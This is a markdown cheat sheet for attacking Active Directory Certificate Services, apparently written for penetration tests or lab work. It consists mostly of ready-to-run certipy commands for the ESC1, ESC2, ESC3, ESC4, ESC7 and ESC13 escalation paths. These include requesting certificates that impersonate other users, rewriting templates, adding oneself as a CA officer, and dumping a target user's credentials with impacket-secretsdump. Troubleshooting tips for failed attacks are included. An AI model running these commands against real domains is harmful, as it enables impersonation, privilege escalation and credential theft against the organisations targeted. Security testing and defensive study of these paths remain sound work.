# AD CS: template checks

Note CA name/FQDN, template, publication, enrollment/edit rights, SID.

```bash
certipy find -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> -vulnerable -stdout
```
- Every `certipy` command below also takes `-hashes [<LM>:]<NT>` (bare `<NT>` works, or `:<NT>` with an empty LM) and `-k -no-pass` (Kerberos ccache) instead of `-p`.
- `-ns <DC-IP>`: Kali's own resolver usually can't resolve the CA host by name — add it so `certipy` can reach the CA at all.

## ESC1
Needs enrollee-supplied SAN, an authentication EKU, enrollment rights, publication by the CA, no manager approval / authorized-signature requirement.

```bash
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -target <CA-FQDN> -ca <CA-NAME> -template <TEMPLATE> \
  -upn <TARGET-USER>@<DOMAIN.TLD> -sid <TARGET-SID>
certipy auth -pfx <FILE>.pfx -dc-ip <DC-IP> -no-hash -no-save
```
- Check the issued cert's identity + SID, then the auth result.
- Patched DCs enforce strong certificate mapping: UPN-only recipes from older labs fail → keep `-sid`.
- Schannel has its own mapping / trust prerequisites.

## ESC2 (Any Purpose / no EKU)
Template defines no EKU, or explicit "Any Purpose" — the resulting cert (for whatever identity you can get into it) isn't restricted to client-auth the way ESC1's check expects:
```bash
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <TEMPLATE>
```
- On its own this only gets a cert for *your own* identity — still useful (PKINIT as yourself where that's otherwise blocked). Combined with ESC1's enrollee-supplied-SAN flaw on the same template, use the ESC1 command above with `-upn`/`-sid` instead. Combined with no other restriction, the cert can also stand in for ESC3's agent cert.

## ESC3 (Certificate Request Agent)
Needs: a template that issues an enrollment-agent cert (Certificate Request Agent EKU), then a *second* template enrollable on-behalf-of others:
```bash
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <AGENT-TEMPLATE>
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <TARGET-TEMPLATE> -on-behalf-of '<DOMAIN>\<TARGET-USER>' -pfx <AGENT>.pfx
```
- First command gets the agent cert; second uses it to request as `<TARGET-USER>` with no SAN needed — the agent cert itself carries the impersonation.

## ESC7 (ManageCA / Certificate Manager)
Needs: `Manage CA` or `Manage Certificates` right on the CA object itself (not a template):
```bash
certipy ca -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -add-officer <USER>
```
- Makes `<USER>` a Certificate Manager, which can approve a pending request (`-issue-request <REQUEST-ID>`) on a template that normally needs manager approval — chain with ESC1/ESC4 on a template that's otherwise correct except for the approval requirement.

## ESC4 (write access to the template)
Save the original first (Certipy 5 flags; older guides use `-save-old`):
```bash
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -save-configuration template-before.json
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -write-default-configuration <YOUR-SID> \
  -save-configuration template-prechange.json
```
Then do ESC1, and restore:
```bash
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -write-configuration template-before.json
```
- Use your own SID in `-write-default-configuration`, not a broad default principal.
- Re-enumerate afterwards; don't overwrite concurrent edits.

## ESC13 (issuance policy linked to a group)
`find` shows `ESC13` / `Linked Groups` on a template you can enroll in, with client auth EKU.
```bash
certipy find -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> -oids -stdout
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -target <CA-FQDN> -ca <CA-NAME> -template <TEMPLATE>
certipy auth -pfx <USER>.pfx -dc-ip <DC-IP>
export KRB5CCNAME=<USER>.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -target-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN.TLD>/<USER>@<DC-FQDN>'
```
- The group SID lives only in the TGT (ccache): the NT hash `auth` prints is your own and carries no extra rights.
- `secretsdump` only works if the linked group has DCSync — check what it can do *before* assuming that.
- No SAN needed: you stay yourself, plus the linked group.

### Finding what the linked group can do
BloodHound shows no path here — the membership only exists inside the TGT, never written to AD, so BloodHound's collected data has nothing to show. Compare writable-object access with and without the ticket:
```bash
bloodyAD --host <DC-FQDN> -d <DOMAIN.TLD> -k get writable        # KRB5CCNAME set: you + the linked group
bloodyAD --host <DC-FQDN> -d <DOMAIN.TLD> -u <USER> -p '<PW>' get writable   # plain user: baseline
```
- Diff the two outputs — anything only in the Kerberos run is what the linked group actually grants.
- `certipy find -oids` can list several issuance policies with similar/identical display names; only the one whose entry shows `Linked Group` is the one that matters here — don't assume the first match.

## ESC8
Live relay to the enrollment endpoint → [ntlm-relay](ntlm-relay.md#ad-cs-relay-esc8). A captured NetNTLM file is not enough.

## When certipy req fails
| Error | Fix |
| --- | --- |
| `CERTSRV_E_KEY_LENGTH` | Template wants a bigger key: `-key-size <N>`, N = `Minimum RSA Key Length` from `find` |

## PKINIT and Schannel failures
`KDC_ERR_PADATA_TYPE_NOSUPP` → DC PKINIT support / certificate config. Schannel / LDAP instead:
```bash
certipy auth -pfx <FILE>.pfx -dc-ip <DC-IP> -ldap-shell
```
- The LDAP shell has the mapped principal's rights, not domain admin by default: check identity (`whoami`) and `help` first.
- Deleting a PFX does not revoke a certificate.
